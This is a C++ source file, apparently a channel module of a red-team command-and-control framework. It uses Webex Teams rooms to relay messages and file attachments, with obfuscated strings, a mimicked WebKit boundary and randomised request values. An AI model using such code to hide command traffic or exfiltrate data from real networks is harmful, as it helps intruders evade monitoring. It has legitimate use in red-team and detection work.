#include "stdafx.h"
#include "WebexTeamsApi.h"
#include "Common/FSecure/CppTools/StringConversions.h"
#include "Common/FSecure/WinHttp/HttpClient.h"
#include "Common/FSecure/WinHttp/Uri.h"
#include <random>
#include <cctype>
#include <algorithm>

using namespace FSecure::StringConversions;
using namespace FSecure::WinHttp;

std::atomic<std::chrono::steady_clock::time_point> FSecure::WebexTeamsApi::s_TimePoint = std::chrono::steady_clock::now();

FSecure::WebexTeamsApi::WebexTeamsApi(SecureString apiEndpoint, SecureString clientId, SecureString clientSecret, SecureString refreshToken, SecureString userAgent)
{
	if (auto winProxy = WinTools::GetProxyConfiguration(); !winProxy.empty())
		this->m_ProxyConfig = (winProxy == OBF(L"auto")) ? WebProxy(WebProxy::Mode::UseAutoDiscovery) : WebProxy(winProxy);

	this->m_ApiEndpoint = OBF("https://") + apiEndpoint;
	this->m_RefreshToken = refreshToken;
	this->m_ClientId = clientId;
	this->m_ClientSecret = clientSecret;
	this->m_UserAgent = userAgent;

	RefreshAccessToken();
}

void FSecure::WebexTeamsApi::RefreshAccessToken()
{
	try
	{
		std::string host = Convert<Utf8>(m_ApiEndpoint.Decrypt() + OBF("/v1/access_token"));
		std::string requestBody = OBF("grant_type=refresh_token");
		requestBody += OBF("&client_id=");
		requestBody += Uri::EncodeData(ByteView(m_ClientId.Decrypt()));
		requestBody += OBF("&client_secret=");
		requestBody += Uri::EncodeData(ByteView(m_ClientSecret.Decrypt()));
		requestBody += OBF("&refresh_token=");
		requestBody += Uri::EncodeData(ByteView(m_RefreshToken.Decrypt()));

		auto response = SendHttpRequest(host, ContentType::ApplicationXWwwFormUrlencoded, requestBody, Method::POST, false);
		SaveAccessToken(json::parse(response));
	}
	catch (std::exception& exception)
	{
		throw std::runtime_error{ OBF_STR("Cannot refresh access token: ") + exception.what() };
	}
}

std::string FSecure::WebexTeamsApi::WriteMessage(std::string const& text, std::string const& roomId)
{
	assert(text.size() <= 7439); // Webex limits message size to max 7439 bytes (https://developer.webex.com/docs/api/v1/messages/create-a-message)

	std::string url = Convert<Utf8>(m_ApiEndpoint.Decrypt()) + OBF("/v1/messages");
	std::string requestBody = OBF("roomId=") + Uri::EncodeData(ByteView(roomId)) + OBF("&text=") + Uri::EncodeData(ByteView(text));
	auto response = SendHttpRequest(url, ContentType::ApplicationXWwwFormUrlencoded, requestBody, Method::POST);
	auto responseJson = json::parse(response);
	return responseJson[OBF("id")].get<std::string>();
}

std::string FSecure::WebexTeamsApi::WriteMessageWithAttachment(ByteVector const& attachment, std::string const& attachmentFilename, std::string const& attachmentMimeType, std::string const& roomId)
{
	assert(attachment.size() <= 100'000'000); // Webex limits attachment size to 100MB (https://developer.webex.com/docs/api/basics#message-attachments)

	std::string url = Convert<Utf8>(m_ApiEndpoint.Decrypt()) + OBF("/v1/messages");
	// Generating body
	std::string boundary = OBF("------WebKitFormBoundary") + Utils::GenerateRandomString(16); // Mimicking WebKit, generate random boundary string
	// Building the multipart body (prefix + attachment + suffix)
	std::string bodyPrefix = OBF("\r\n");
	bodyPrefix += OBF("--") + boundary + OBF("\r\n");
	bodyPrefix += OBF("Content-Disposition: form-data; name=\"files\"; filename=\"") + attachmentFilename + OBF("\"") + OBF("\r\n");
	bodyPrefix += OBF("Content-Type: ") + attachmentMimeType + OBF("\r\n\r\n");
	//std::string bodySuffix = OBF("\r\n");
	std::string bodySuffix = OBF("\r\n--") + boundary + OBF("\r\n");
	bodySuffix += OBF("Content-Disposition: form-data; name=\"roomId\"\r\n\r\n");
	bodySuffix += roomId;
	bodySuffix += OBF("\r\n--") + boundary + OBF("--");
	std::vector<uint8_t> body;
	body.insert(body.begin(), std::move(bodyPrefix.begin()), std::move(bodyPrefix.end())); // Insert the prefix
	body.insert(body.end(), attachment.begin(), attachment.end()); // Insert the attachment content
	body.insert(body.end(), std::move(bodySuffix.begin()), std::move(bodySuffix.end())); // Insert the suffix
	// Send HTTP request
	std::wstring contentType = OBF(L"multipart/form-data; boundary=") + Convert<Utf16>(boundary);
	json response = json::parse(SendHttpRequest(url, contentType, body, Method::POST));
	return response[OBF("id")].get<std::string>();
}

std::vector<std::tuple<std::string, FSecure::ByteVector, bool>> FSecure::WebexTeamsApi::GetMessages(std::string const& roomId)
{
	std::string url = Convert<Utf8>(m_ApiEndpoint.Decrypt()) + OBF("/v1/messages");
	std::string parameters = OBF("max=") + std::to_string(FSecure::Utils::GenerateRandomValue(1000, 2000)) + OBF("&roomId=") + Uri::EncodeData(ByteView(roomId)); // Make sure we get all messages by including a large 'max' value
	auto response = SendHttpRequest(url + OBF("?") + parameters, {}, {}, Method::GET);
	auto responseJson = json::parse(response);

	// Parse response, extract messages, sort them by creation date and return a list of pairs (<messageId, messageText>)
	auto messages = std::vector<json>{};
	for (auto& messageJson : responseJson[OBF("items")]) {
		messages.emplace_back(messageJson);
	}
	std::sort(messages.begin(), messages.end(),
		[](auto const& a, auto const& b) { return a[OBF("created")] < b[OBF("created")]; }
	);
	std::vector<std::tuple<std::string, ByteVector, bool>> result;
	for (auto& messageJson : messages) {
		std::string messageId = messageJson[OBF("id")];
		if (messageJson.contains(OBF("files"))) {
			// Message contents is in the attachment
			std::string attachmentUrl = messageJson[OBF("files")][0].get<std::string>();
			auto resp = SendHttpRequest(attachmentUrl, {}, {}, Method::GET);
			ByteVector messageText = resp;
			result.emplace_back(std::make_tuple(std::move(messageId), std::move(messageText), true));
		}
		else {
			// Message contents is in the body of the message
			ByteVector messageText = ByteView(messageJson[OBF("text")].get<std::string>());
			result.emplace_back(std::make_tuple(std::move(messageId), std::move(messageText), false));
		}
		
	}
	return result;
}



std::map<std::string, std::string> FSecure::WebexTeamsApi::ListRooms()
{
	std::map<std::string, std::string> roomMap;
	std::string url = Convert<Utf8>(m_ApiEndpoint.Decrypt()) + OBF("/v1/rooms");

	auto response = SendHttpRequest(url, {}, {}, Method::GET);
	auto responseJson = json::parse(response);
	for (auto& room : responseJson[OBF("items")])
	{
		std::string roomName = room[OBF("title")].get<std::string>();
		std::string roomId = room[OBF("id")].get<std::string>();
		roomMap.insert({ roomName, roomId });
	}
	return roomMap;
}

std::string FSecure::WebexTeamsApi::GetOrCreateRoom(std::string const& roomName)
{
	// Get all existing rooms
	auto rooms = ListRooms();
	// Check if desired room is already present in existing rooms
	for (auto& tuple : rooms) {
		if (tuple.first == roomName) {
			return tuple.second;
		}
	}
	// Room was not found, so let's create a new one
	return CreateRoom(roomName);
}

std::string FSecure::WebexTeamsApi::CreateRoom(std::string const& roomName)
{
	std::string url = Convert<Utf8>(m_ApiEndpoint.Decrypt()) + OBF("/v1/rooms");
	std::string requestBody = OBF("title=") + Uri::EncodeData(ByteView(roomName));
	auto response = SendHttpRequest(url, ContentType::ApplicationXWwwFormUrlencoded, requestBody, Method::POST);
	auto responseJson = json::parse(response);
	return responseJson[OBF("id")].get<std::string>();
}

void FSecure::WebexTeamsApi::DeleteMessage(std::string const& messageId)
{
	std::string url = Convert<Utf8>(m_ApiEndpoint.Decrypt()) + OBF("/v1/messages/") + messageId;
	SendHttpRequest(url, {}, {}, Method::DEL);
}

void FSecure::WebexTeamsApi::SaveAccessToken(FSecure::json data)
{
	int32_t timeToNextRefresh = data[OBF("expires_in")].get<int32_t>();
	m_AccessTokenExpiryTime = FSecure::Utils::TimeSinceEpoch() + timeToNextRefresh; // Set the new expiry time for this access token
	m_AccessToken = data[OBF("access_token")].get<std::string>();
	//std::cout << OBF("Access token refreshed: ") + m_AccessToken.Decrypt() << std::endl;
	//std::cout << OBF("Access token refreshed; new refresh in ") + std::to_string(timeToNextRefresh) + OBF(" seconds.") << std::endl;
}

void FSecure::WebexTeamsApi::EvaluateResponse(std::string const& host, WinHttp::Method method, WinHttp::HttpRequest const& req, WinHttp::HttpResponse const& resp, bool tryRefreshingToken)
{
	/*
	std::cout << OBF("Evaluating request to ") + Convert<Utf8>(GetMethodString(method)) + OBF(" ") + host << std::endl;
	std::cout << OBF("Response code was ") + std::to_string(resp.GetStatusCode()) << std::endl;
	if (req.m_Data.size() < 20'000) {
		std::cout << (std::string)ByteView(req.m_Data) << std::endl;
	}
	else {
		std::cout << OBF("[request too large to print]") << std::endl;
	}
	if (resp.GetData().size() < 20'000) {
		std::cout << (std::string)resp.GetData() << std::endl;
	}
	else {
		std::cout << OBF("[response too large to print]") << std::endl;
	}
	*/

	if (resp.GetStatusCode() >= 200 && resp.GetStatusCode() < 300)
		return;

	if (resp.GetStatusCode() == StatusCode::TooManyRequests) // break and set sleep time.
	{
		auto retryAfterHeader = resp.GetHeader(Header::RetryAfter);
		auto delay = !retryAfterHeader.empty() ? stoul(retryAfterHeader) : FSecure::Utils::GenerateRandomValue(10, 20);
		s_TimePoint = std::chrono::steady_clock::now() + std::chrono::seconds{ delay };
		throw std::runtime_error{ OBF("HTTP 429 - Too many requests") };
	}

	if (resp.GetStatusCode() == StatusCode::Unauthorized)
	{
		if (tryRefreshingToken)
			RefreshAccessToken();
		throw std::runtime_error{ OBF("HTTP 401 - Token being refreshed") }; // Throwing an exception will retry the operation
	}

	if (resp.GetStatusCode() == StatusCode::BadRequest)
		throw std::runtime_error{ OBF("HTTP 400 - Bad Request\r\n") + ((std::string)resp.GetData()) };

	throw std::runtime_error{ OBF("Non 200 response:") + std::to_string(resp.GetStatusCode()) };
}

void FSecure::WebexTeamsApi::RateLimitDelay(std::chrono::milliseconds min, std::chrono::milliseconds max)
{
	if (s_TimePoint.load() > std::chrono::steady_clock::now()) {
		auto sleepUntil = s_TimePoint.load() + FSecure::Utils::GenerateRandomValue(min, max);
		std::this_thread::sleep_until(sleepUntil);
	}
}

void FSecure::WebexTeamsApi::SetRefreshToken(SecureString newRefreshToken)
{
	this->m_RefreshToken = newRefreshToken;
	RefreshAccessToken();
}

FSecure::ByteVector FSecure::WebexTeamsApi::SendHttpRequest(std::string const& host, std::wstring const& contentType, std::vector<uint8_t> const& data, WinHttp::Method httpMethod, bool addAuthorizationHeader)
{
	HttpClient webClient(Convert<Utf16>(host), m_ProxyConfig);
	HttpRequest request;
	request.m_Method = httpMethod;

	if (!data.empty())
	{
		request.SetData(contentType, data);
	}
	if (addAuthorizationHeader) {
		request.SetHeader(Header::Authorization, OBF(L"Bearer ") + Convert<Utf16>(this->m_AccessToken.Decrypt()));
	}
	request.SetHeader(Header::UserAgent, Convert<Utf16>(this->m_UserAgent.Decrypt()));
	auto resp = webClient.Request(request);
	EvaluateResponse(host, httpMethod, request, resp, !addAuthorizationHeader);
	return resp.GetData();
}

FSecure::ByteVector FSecure::WebexTeamsApi::SendHttpRequest(std::string const& host, WinHttp::ContentType contentType, std::string const& data, WinHttp::Method httpMethod, bool addAuthorizationHeader) {
	return SendHttpRequest(host, WinHttp::GetContentType(contentType), { data.begin(), data.end() }, httpMethod, addAuthorizationHeader);
}